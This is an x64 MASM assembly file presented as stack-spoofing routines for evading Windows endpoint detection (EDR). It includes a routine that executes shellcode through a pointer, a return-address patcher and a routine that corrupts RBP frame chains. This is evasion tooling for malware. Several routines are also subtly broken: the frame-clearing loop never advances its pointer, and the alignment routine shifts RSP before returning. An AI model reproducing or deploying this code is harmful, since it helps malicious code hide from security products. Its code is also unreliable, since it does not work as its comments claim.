; Professional Stack Spoofing for Windows x64 EDR Evasion
; =============================================================================

PUBLIC SpooledExecution
PUBLIC SpoofedRtlUserThreadStart
PUBLIC ObfuscateReturnAddress
PUBLIC ClearRBPChain
PUBLIC ValidateStackAlignment

.code

; =============================================================================
; SpooledExecution - Execute shellcode with fake RBP chain
; RCX = shellcode function pointer
; RDX, R8, R9 = parameters (unused but preserved)
; =============================================================================
SpooledExecution PROC
    push rbp
    mov rbp, rsp
    sub rsp, 40h
    
    mov rax, rcx
    
    ; Setup fake return address - use a local label
    lea r10, dummy_label
    mov qword ptr [rsp + 8], r10
    
    ; Execute shellcode
    call rax
    
    ; Cleanup and return
    add rsp, 40h
    pop rbp
    ret

dummy_label:
    nop
    nop
    ret

SpooledExecution ENDP


; =============================================================================
; SpoofedRtlUserThreadStart - Thread start spoofing
; RCX = function pointer
; RDX = parameter (unused)
; =============================================================================
SpoofedRtlUserThreadStart PROC
    push rbp
    mov rbp, rsp
    sub rsp, 28h
    
    mov rax, rcx
    xor rcx, rcx
    call rax
    
    add rsp, 28h
    pop rbp
    ret

SpoofedRtlUserThreadStart ENDP


; =============================================================================
; ObfuscateReturnAddress - Patch return address on stack
; RCX = address of return pointer
; RDX = fake return address
; =============================================================================
ObfuscateReturnAddress PROC
    mov [rcx], rdx
    ret
ObfuscateReturnAddress ENDP


; =============================================================================
; ClearRBPChain - Corrupt RBP chain
; RCX = frame count
; RDX = starting RBP pointer
; =============================================================================
ClearRBPChain PROC
    mov r8, rdx
    mov r9d, ecx

clear_loop:
    test r9d, r9d
    jz clear_done
    mov qword ptr [r8], 0
    mov qword ptr [r8 + 8], 0
    dec r9d
    jnz clear_loop

clear_done:
    ret
ClearRBPChain ENDP


; =============================================================================
; ValidateStackAlignment - Ensure proper x64 ABI alignment
; =============================================================================
ValidateStackAlignment PROC
    mov rax, rsp
    and rax, 0Fh
    cmp rax, 8
    je aligned_ok
    sub rsp, 8

aligned_ok:
    ret
ValidateStackAlignment ENDP

END
